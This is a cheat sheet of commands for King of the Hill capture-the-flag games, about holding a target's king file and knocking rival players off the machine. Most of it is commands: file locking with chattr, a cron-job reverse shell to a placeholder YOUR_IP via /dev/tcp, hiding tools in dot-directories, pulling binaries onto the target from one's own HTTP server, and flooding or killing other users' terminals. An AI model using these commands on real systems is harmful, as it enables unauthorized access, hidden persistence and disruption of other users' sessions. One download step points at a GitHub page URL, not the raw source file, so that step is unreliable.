# KOTH-Tricks
## Make king.txt unwritable
### Using noclobber
```
set -o noclobber /root/king.txt
```
### Using chattr
```
 chattr +ai /root/king.txt
```
If chattr binary is not present on the machine you can download it into your machine and after compiling you can upload into KOTH_machine and use it

Downloading into Local Machine
 ```
wget https://github.com/posborne/linux-programming-interface-exercises/blob/master/15-file-attributes/chattr.c
gcc chattr.c -o chattr
```
Uploading to KOTH_machine
```
python3 -m http.server 8080       //on your local machine start a python server
wget http://yourip:port/chattr   //on the KOTH_machine for download the binary
chmod +x chattr
./chattr +ai /root/king.txt
```
-----------------------------------------------------------------------------
-----------------------------------------------------------------------------
## Use . for creating hidden directory where you can store your binaries
```
mkdir .hidden_folder
cd .hidden_folder
```
-----------------------------------------------------------------------------
-----------------------------------------------------------------------------
## Use Cronjobs for automation
> Run 'crontab -e' and paste these line
### Reverse shell
```
* * * * * /bin/sh -i >& /dev/tcp/YOUR_IP/LISTENING_PORT 0>&1
```
### Write to king.txt
```
* * * * * echo "USERNAME" > /root/king.txt >/dev/null 2>&1
```
-----------------------------------------------------------------------------
-----------------------------------------------------------------------------
## Breaking opponent shell
### find opponent pts using these commands
```
ps aux | grep pts
who
w
```
### Spam urandom to opponent shell
```
cat /dev/urandom >/dev/pts/#
```
>  NOTE: place opponent pts in place of '#' 
### Using script
```
script -f /dev/pts/#
```
### Spam your username to opponent shell
```
while true; do echo 'YOUR_USERNAME' >/dev/pts/#; done 
```
### Kill opponent shell
```
pkill -9 -t pts/#
```
### Using nyancat
Downloading nyancat to local Machine
```
git clone https://github.com/klange/nyancat
cd nyancat/src
make
```
Sending nyancat to KOTH_machine
```
python3 -m http.server 8080        //on your local machine start a python server into 'nyancat/src' folder
wget http://yourip:port/nyancat   //on the KOTH_machine
chmod +x nyancat
./nyancat > /dev/pts/#
```
-----------------------------------------------------------------------------
-----------------------------------------------------------------------------
## while loop Tricks
```
while [[ $(cat /root/king.txt) != "YOUR_USERNAME" ]]; do echo "YOUR_USERNAME" > /root/king.txt; done
while true; do chattr -ia /root/king.txt 2>/dev/null; echo "YOUR_USERNAME" >/root/king.txt 2>/dev/null; chattr +ia /root/king.txt 2>/dev/null; done
```
# Keep connected more coming in future......
